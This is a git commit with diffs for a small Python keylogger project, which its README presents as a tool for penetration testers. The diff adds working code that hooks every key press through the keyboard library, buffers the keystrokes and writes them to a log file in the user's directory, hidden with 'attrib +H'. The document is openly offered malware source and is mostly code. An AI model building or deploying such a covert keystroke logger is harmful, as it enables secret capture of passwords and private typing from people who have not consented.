05bfd655a0d4aaa5c1e94c93b2f50a97e76fb972
Fadi1089 <fadi.soltan1089@gmail.com>
2024-06-29 16:02:38 +0200

    utilisation of the keyboard python library + modified the method of writing data to the log file to enchance readability

--- README.md
+++ README.md
@@ -1,3 +1,4 @@
 # Demo 2
 
-This is a simple python keylogger that captures keystrokes and saves them to a hidden log file in the Users/CURRENTUSER directory.
+This is a simple python keylogger that captures keystrokes and saves them to a hidden log file in the Users/CURRENT_USER directory in a readable format for the penetration tester.
+
--- keylogger.py
+++ keylogger.py
@@ -1,25 +1,59 @@
 import keyboard
 import subprocess
+import base64
 
+# varaibles
 log = "C:/Users/fadis/.log.txt"
 
+data = []
+backspace_count = 0
+delete_count = 0
+
+
 def on_key_press(event):
+        global data, backspace_count, delete_count
+
+        if event.name == "backspace":
+            backspace_count += 1
+
+        elif event.name == "delete":
+            delete_count += 1
+
+        else:
+            if backspace_count > 0:
+                data.append("\nBackSpace {}x\n".format(backspace_count))
+                backspace_count = 0
+            elif delete_count > 0:
+                data.append("\nDelete {}x\n".format(backspace_count))
+                delete_count = 0
+            data.append(event.name)
+
+try:
     with open(log, "a") as file:
+
+        # creation and hiding of the log file
+        file.write("[New log file].\n\n")
         subprocess.run(["attrib", "+H", log], check=True)
-        file.write("{}\n".format(event.name))
+        print("Log file created and hidden successfully.")
 
-    if event.name == "esc":
-        exit()
+        # setting up the key listener
+        keyboard.on_press(on_key_press)
 
-# Creating the log file nad hiding it
-# log = open("C:/Users/fadis/.log.txt", "x")
+        while not keyboard.is_pressed("esc"):
 
-# Writing the First line to the log file and closes it
-# log.write("Beginning of logfile")
-# log.close()
+            # write collected keystrokes data to the file
+            if data:
+                key = data.pop(0)
+                if keyboard.is_pressed("enter"):
+                    file.write("\n<ENTER>\n")
+                elif keyboard.is_pressed("space"):
+                    file.write(" <SPACE> ")
+                elif keyboard.is_pressed("shift"):
+                    file.write(" <SHIFT> ")
+                else:
+                    file.write(key)
+                file.flush()
 
-# Registering the Keystrokes
-keyboard.on_press(on_key_press)
-
-# Review what the fuck this line does
-keyboard.wait()
+except PermissionError as e:
+    print(f"PermissionError: {e}")
+    print("Please check if you have the necessary permissions to write to the file.")
